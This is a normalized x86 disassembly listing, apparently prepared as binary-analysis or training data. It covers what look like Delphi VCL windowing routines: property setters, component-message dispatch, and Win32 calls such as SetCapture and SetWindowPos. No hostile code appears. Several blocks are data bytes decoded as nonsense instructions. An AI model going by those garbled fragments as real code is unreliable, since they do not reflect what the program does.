sub_434b3a
pop ebx
mov esp ebp
pop ebp
retn
sub_434c30
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
sub_434d66
jmp sub_404444
sub_434e3c
jmp sub_4046f8
sub_434e67
jmp sub_4046f8
sub_434e88
movzx eax [ eax + 0x41 ]
xor al 0x1
retn
sub_43507c
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_4347b8
sub_435100
jmp sub_4046f8
sub_435144
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_43515c
push ebx
mov ebx eax
mov eax ebx
call sub_41dec4
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_4351ae
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_4347b8
sub_435224
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4353c3
jmp sub_4046f8
sub_4353ca
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_435610
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_435620
sub_435674
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
movzx eax [ eax + rw-data ]
retn
sub_435684
and edx 0x7f
movzx edx [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_435698
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
movzx eax [ eax + rw-data ]
retn
sub_4356a8
and edx 0x7f
movzx edx [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_4356bc
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_435738
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_4316f0
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_4316f0
retn
sub_435754
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_4316f0
sub_43579c
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_434770
retn
mov eax edx
retn
sub_4357d6
jmp sub_404444
sub_4357db
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_4589e0
call sub_404854
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_435b42
jmp sub_4046f8
sub_435b49
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403f64
retn
sub_435b5f
jmp sub_4046f8
sub_435c60
jmp sub_4046f8
sub_435c67
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435c84
mov eax [ ebp - 0x14 ]
call sub_403f64
retn
sub_435c7d
jmp sub_4046f8
sub_435ca2
jmp sub_4046f8
sub_435d2c
jmp sub_4046f8
sub_435d33
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_435d64
push ebx
mov ebx eax
mov eax ebx
call sub_416964
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_41ec8c
sub_435e28
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_435e3c
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_435e44
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_4362d3
jmp sub_4046f8
sub_4362da
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4363dc
jmp sub_4046f8
sub_4363e3
pop ebp
retn
sub_4379ce
jmp r-xdata
sub_4379d0
0xe8ffe9ff 0xe7ff
sub_4379d7
jmp esi
sub_437aa6
dec esp
0xc8680043 0x43
sub_437aae
push eax
mov ebp 0xdc380043
inc ebx
add al bh
rol [ ebx ] cl
movsb [ edi ] [ esi ]
fadd [ ebx ]
or al 0xcd
inc ebx
add [ eax ] cl

sub_437ac4
inc ebx
add [ esp + ebp * 8 ] cl
inc ebx
add [ eax ] ah

sub_437acc
inc ebx
add al cl
mov ecx 0xcb4c0043
inc ebx
add [ eax + 0x740043cb ] ah
int3
sub_4385bc
mov al [ 0x140043b3 ]
mov edi 0xb39c0043
inc ebx
add [ eax + 0x7c0043c0 ] ah
push ecx
inc esp
add [ eax ] dh
retn
sub_438728
mov al [ 0x140043b3 ]
mov edi 0xb39c0043
inc ebx
add [ eax + 0x7c0043c0 ] ah
push ecx
inc esp
add [ eax ] dh
retn
sub_438ddb
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_416270
retn
sub_438df8
push 0x15
mov ecx rw-data
call sub_416230
retn
sub_438ee4
call GetCapture
call sub_438b98
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_439178
push ebx
push eax
push sub_439330
call sub_41ebd8
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_439190
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_4391c0
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_41ec8c
pop ebx
retn
sub_4392d3
jmp sub_404444
sub_439304
xor eax eax
retn
sub_439308
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_439320
retn
sub_439324
mov eax [ rw-data ]
retn
sub_43932c
retn
sub_43935a
jmp sub_404444
sub_43935f
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_4589e0
call sub_404854
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43937c
call sub_4041bc
xor eax eax
mov [ rw-data ] eax
retn
sub_43938c
call sub_4041b8
xor eax eax
mov [ rw-data ] eax
retn
sub_43939c
test dl dl
je r-xdata
mov [ eax + 0x40 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_404288
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_439444
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x40 ]
movzx eax [ eax + 0x7e ]
jmp r-xdata
pop ebp
retn 0x4
sub_43945c
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_4394a8
retn
sub_4395a4
push ebp
mov ebp esp
push esi
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ esi + 0x40 ]
mov si 0xffe5
call sub_404160
pop esi
pop ebp
retn 0x4
sub_439660
push esi
mov edx eax
mov eax [ eax + 0x40 ]
mov si 0xffdb
call sub_404160
pop esi
retn
sub_439674
push esi
mov edx eax
mov eax [ eax + 0x40 ]
mov si 0xffda
call sub_404160
pop esi
retn
sub_439688
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_439694
mov al 0x1
retn
sub_439698
mov eax 0x4
retn
sub_4396a0
retn
sub_43a2ad
jmp sub_404444
sub_43a587
jmp sub_4046f8
sub_43a5e3
jmp sub_4046f8
sub_43a655
jmp sub_4046f8
sub_43a664
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_43a340
sub_43a7e7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_424450
retn
sub_43a7fd
jmp sub_4046f8
sub_43a824
jmp sub_4046f8
sub_43a8a6
jmp sub_4046f8
sub_43a8ce
jmp sub_4046f8
sub_43a8d5
mov esp ebp
pop ebp
retn
sub_43a98d
jmp sub_4046f8
sub_43a9e4
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_43a9b0
mov [ ebx + 0x58 ] esi
sub_43ab38
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_43ab4c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_404114
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_43ac35
jmp sub_4046f8
sub_43ac3c
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43acbf
jmp sub_4046f8
sub_43acc6
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_43accc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4040f0
pop ebx
retn
sub_43ad14
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4040f0
pop ebx
retn
sub_43ae1c
retn
sub_43ae40
retn
sub_43b160
xor eax eax
retn
sub_43b164
movzx eax [ eax + 0x58 ]
retn
sub_43b16c
xor eax eax
retn
sub_43b170
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_43b178
mov eax [ eax + 0x30 ]
retn
sub_43b220
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_43b34c
push ebx
mov ebx eax
movzx eax [ ebx + 0x5b ]
movzx eax [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_43b39c
mov [ eax + 0x5d ] dl
retn
sub_43b3a0
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_43fa00
sub_43b3b0
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_43b9b8
jmp sub_4046f8
sub_43b9bf
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_43ba20
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x160 ] edx
retn
mov [ eax + 0x158 ] 0x1
sub_43ba9c
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_43bbb9
jmp sub_4046f8
sub_43bbc0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43bd40
push eax
xor ecx ecx
mov edx 0xb037
call sub_43d400
retn
sub_43bf17
cmp dl [ esi + 0x5c ]
je r-xdata
pop esi
retn
mov [ esi + 0x5c ] dl
test dl dl
je r-xdata
mov eax esi
mov si 0xffee
call sub_404160
sub_43bfc6
jmp sub_4046f8
sub_43bfcd
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43c0a0
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_43d400
sub_43c0b8
push 0x0
xor ecx ecx
mov edx 0xe
call sub_43d400
retn
sub_43c0c8
push edx
mov edx 0xd
call sub_43d400
retn
sub_43c0d4
mov edx [ eax + 0xa0 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_43c0e8
mov edx [ eax + 0x9c ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_43c1cd
jmp sub_4046f8
sub_43c1d4
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43c1dc
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_43d400
sub_43c24c
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_43c260
movzx eax [ eax + 0x8e ]
xor al 0x1
retn
sub_43c26c
movzx eax [ eax + 0x60 ]
xor al 0x1
retn
sub_43c274
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_43d400
sub_43c298
cmp dl [ eax + 0x8d ]
je r-xdata
retn
mov [ eax + 0x8d ] dl
mov [ eax + 0x8e ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_43d400
sub_43c2bc
cmp dl [ eax + 0x8e ]
je r-xdata
retn
mov [ eax + 0x8e ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_43d400
sub_43c304
movzx eax [ eax + 0x5a ]
xor al 0x1
retn
sub_43c30c
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_43d400
sub_43c330
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_43d400
sub_43c354
cmp dx [ eax + 0x7c ]
je r-xdata
retn
mov [ eax + 0x7c ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_43d400
sub_43c370
push ebx
mov ebx eax
call sub_438ee4
cmp ebx eax
sete al
pop ebx
retn
sub_43c3a8
push esi
mov esi eax
mov dl 0x1
mov eax esi
mov si 0xffce
call sub_404160
pop esi
retn
sub_43c4fe
jmp sub_4046f8
sub_43c505
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43c628
test [ eax + 0x50 ] 0x40
setne cl
movzx edx [ eax + 0x57 ]
call sub_43c59c
retn
sub_43c6fc
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8c ]
sub_43c710
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_43c7f5
jmp sub_4046f8
sub_43c818
xor eax eax
retn
sub_43c81c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_43c834
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_43c84c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
movzx eax [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_43c868
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
movzx edx [ edx + 0x4 ]
call sub_43c884
retn
sub_43c970
retn
sub_43c974
cmp eax [ rw-data ]
sete al
retn
sub_43c9e8
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_43cb08
push ebp
mov ebp esp
push esi
mov esi edx
mov edx esi
mov si 0xffd1
call sub_404160
pop esi
pop ebp
retn 0x4
sub_43cb4c
push ebx
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_43ce27
jmp sub_4046f8
sub_43ce2e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43ce38
push esi
xor ecx ecx
mov si 0xffe8
call sub_404160
pop esi
retn
sub_43ce48
push esi
mov cl 0x1
mov si 0xffe8
call sub_404160
pop esi
retn
sub_43d114
jmp sub_4046f8
sub_43d1bc
push esi
mov esi eax
mov eax esi
mov si 0xffee
call sub_404160
pop esi
retn
sub_43d1cc
mov al 0x1
retn
sub_43d4d8
retn
sub_43d82d
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41aba0
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_43d848
movzx eax [ eax + 0x5e ]
xchg edx eax
call sub_41cfdc
retn
sub_43dc37
add [ ebx - 0x75 ] dl
fsub [ esi - 0x7d ]
mov ebx 0x112
add [ ebp + ebp - 0x75 ] dh
retn
sub_43dca4
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_43e2e0
push esi
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
retn
sub_43e2f0
push esi
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
retn
sub_43e300
push esi
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
retn
sub_43e3d4
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_43e460
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_43c23c
mov [ ebx + 0x56 ] 0x1
sub_43e484
mov [ edx + 0xc ] 0x1
retn
sub_43e504
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_43e76c
jmp sub_4046f8
sub_43e773
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43e7a0
mov eax [ r-xdata ]
retn
sub_43e91d
jmp sub_4046f8
sub_43e924
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43ea44
mov eax [ eax + 0xac ]
retn
sub_43ea6c
push ebx
mov ebx eax
mov eax ebx
call sub_43c81c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_43ea88
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_43ec40
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_43ec70
mov edx [ eax ]
call [ edx + 0x5c ]
retn
sub_43ec78
mov eax [ eax + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_43ecf0
mov eax [ eax + 0x184 ]
xchg edx eax
call sub_41cff0
retn
sub_43ed00
mov eax [ eax + 0x18c ]
xchg edx eax
call sub_41cff0
retn
sub_43ed10
mov eax [ eax + 0x180 ]
xchg edx eax
call sub_41cff0
retn
sub_43ed20
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41b700
mov [ ebx + 0x188 ] eax
pop esi
pop ebx
retn
sub_43ed38
mov eax [ eax + 0x188 ]
xchg edx eax
call sub_41cff0
retn
sub_43ed48
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41b700
mov [ ebx + 0x184 ] eax
pop esi
pop ebx
retn
sub_43ed60
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41b700
mov [ ebx + 0x18c ] eax
pop esi
pop ebx
retn
sub_43ed78
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41b700
mov [ ebx + 0x180 ] eax
pop esi
pop ebx
retn
sub_43edb4
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_43edbc
call sub_43af3c
retn
sub_43eede
jmp sub_4046f8
sub_43f0ac
jmp sub_4046f8
sub_43f0fc
jmp sub_4046f8
sub_43f9db
jmp sub_4046f8
sub_43fa87
jmp sub_4046f8
sub_43fa94
inc [ eax + 0x190 ]
retn
sub_43fa9c
dec [ eax + 0x190 ]
cmp [ eax + 0x190 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_43fabc
sub_43fabc
xor edx edx
call sub_43fa00
retn
sub_43fb89
jmp sub_4046f8
sub_43fb90
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43fc86
jmp sub_4046f8
sub_440222
jmp sub_4046f8
sub_440229
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4403f1
jmp sub_4046f8
sub_4403f8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4404cc
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_4406c9
jmp sub_4046f8
sub_4406d0
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x1b4 ] edx
pop ecx
pop ebp
retn
sub_4408ec
cmp [ eax + 0x1b4 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_43d400
sub_440960
jmp sub_4046f8
sub_440a8c
jmp sub_404444
sub_440bd1
jmp sub_4046f8
sub_440c23
jmp sub_4046f8
sub_440c2a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_440c34
jmp sub_404444
sub_440c39
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_4589e0
call sub_404854
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_441443
jmp sub_4046f8
sub_4416ba
jmp sub_4046f8
sub_4416f7
jmp sub_4046f8
sub_4416fe
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_441708
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_4418dd
jmp sub_4046f8
sub_441b78
jmp sub_4046f8
sub_441b7f
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xff7f
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_441ce2
jmp sub_4046f8
sub_441d34
push ebx
mov ebx eax
call sub_422c54
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_43d400
pop ebx
retn
sub_441d50
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_43d400
retn
sub_441d64
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_43d400
retn
sub_441d74
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_43d400
retn
sub_442070
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_443f94
mov eax esi
call sub_43ecbc
pop esi
retn
sub_442190
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4421f0
xor edx edx
mov eax esi
call sub_445008
pop esi
retn
sub_4421ac
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_442320
mov dl 0x1
mov eax esi
call sub_445008
pop esi
retn
sub_4421c8
push esi
mov esi eax
mov [ esi + 0x241 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_4421dc
push esi
mov esi eax
mov [ esi + 0x241 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_44230f
jmp sub_4046f8
sub_442316
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4423ef
jmp sub_4046f8
sub_4423f6
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_442400
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
pop esi
retn
sub_442410
retn
sub_442414
push ebx
cmp [ eax + 0x1f2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
sub_442434
push ebx
cmp [ eax + 0x1fa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1fc ]
call [ ebx + 0x1f8 ]
sub_44259c
mov edx [ eax + 0x1ac ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_44266c
retn
sub_4427b8
jmp sub_4046f8
sub_4427bf
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44288b
jmp sub_4046f8
sub_4428b8
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1db ] 0x0
je r-xdata
retn
cmp [ eax + 0x1b0 ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x1b0 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_44294b
jmp sub_4046f8
sub_442b64
push ebx
cmp [ eax + 0x212 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x214 ]
call [ ebx + 0x210 ]
sub_442e40
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x1b4 ] eax
mov [ esi + 0x1da ] 0x0
pop esi
retn
sub_442f1c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_440008
pop esi
retn
sub_442fdc
push esi
mov esi eax
mov eax esi
mov si 0xffc0
call sub_404160
pop esi
retn
sub_44300c
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_443020
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_443034
call sub_43ff98
retn
sub_44303c
call sub_43ff98
retn
sub_443044
call sub_43ff98
retn
sub_44307c
movzx edx [ eax + 0x1da ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x1b4 ]
push eax
call SetWindowPos
retn
sub_4430ec
push ebx
mov ebx eax
mov eax ebx
call sub_43e300
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x1a4 ]
call sub_423ec8
mov dx 0xb009
mov eax ebx
call sub_440008
pop ebx
retn
sub_443250
call sub_43ff98
retn
sub_443258
call sub_43ff98
retn
sub_443260
call sub_43ff98
retn
sub_443268
call sub_43ff98
retn
sub_4432d0
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4432e4
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_443786
jmp sub_4046f8
sub_44378d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44386c
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
sub_443a10
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_43d400
retn
sub_443ab4
push ebx
mov ebx eax
mov eax ebx
call sub_443f88
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x1b4 ]
push eax
call UpdateWindow
sub_443ad0
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8c ]
pop ebx
retn
sub_443d50
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_443be8
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_443da4
cmp edx [ eax + 0x19c ]
je r-xdata
retn
mov [ eax + 0x19c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_43d400
sub_443dc4
cmp dl [ eax + 0x1d9 ]
je r-xdata
retn
mov [ eax + 0x1d9 ] dl
mov [ eax + 0x1dd ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_43d400
